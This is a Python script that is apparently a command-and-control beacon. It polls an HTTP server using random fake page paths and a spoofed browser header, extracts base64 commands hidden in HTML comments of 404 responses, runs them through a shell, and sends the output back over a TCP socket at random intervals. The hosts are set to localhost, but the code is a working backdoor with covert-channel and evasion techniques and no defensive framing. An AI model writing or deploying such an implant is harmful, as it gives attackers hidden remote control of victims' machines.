#!/usr/bin/python3
import base64
import os
import random
import requests
import socket
import string
import struct
import subprocess
import time

def random_string():
    return ''.join(random.choices(string.ascii_letters+string.digits, k=random.randint(2,10)))

def random_filepath():
    return '/'.join(random_string() for _ in range(random.randint(1,3)))

def get_command(server):
    connect = "http://"+server+":8000/"+random_filepath()+".html"
    headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
                "Host": server,
                "Accept-Language": "en-us",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "Keep-Alive"
            }
    r = requests.get(connect, headers=headers)
    if r.status_code == 404:
        txt = r.text
        if "<!-- " in txt:
            b64 = txt.split("<!-- ")[1].split(" -->")[0]
            return b64
        else:
            return None
    else:
        return None

def run_command(b64):
    cmd = base64.b64decode(str.encode(b64)).decode()
    recv = cmd.split("#!")
    FNULL = open(os.devnull, 'w')
    out = subprocess.Popen(recv[0], shell=True, stderr=FNULL, stdout=subprocess.PIPE).stdout.read()
    FNULL.close()
    return return_result(out, recv[1], int(recv[2]))

def send_msg(sock, msg):
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def return_result(out, host, port):
    host = "127.0.0.1"
    send = base64.b64encode(out)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        send_msg(s, send)
        s.shutdown(socket.SHUT_RDWR)
        s.close()
    return send

if __name__ == "__main__":
    while True:
        b64 = get_command("localhost")
        if b64 == None:
            print("No command found")
        else:
            run_command(b64)
        time.sleep(random.randint(30, 60))
